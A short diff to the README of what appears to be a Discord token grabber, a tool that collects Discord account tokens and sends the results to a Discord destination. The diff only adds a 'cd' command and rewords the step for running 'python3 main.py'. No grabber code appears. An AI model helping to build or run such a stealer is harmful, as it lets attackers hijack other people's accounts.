@@ -3,8 +3,12 @@ A simple token grabber to grab your discord token. It sends all results to a Dis
 
 # How To Run
 
-1. Open Command Prompt and go into the Directory.
-2. Run
+1. Open Command Prompt and go into the Directory by entering this command:
+```
+cd DSB-OAD-Discord-Token-Grabber-main
+```
+
+2. Run:
 ```
 python3 main.py
 ```
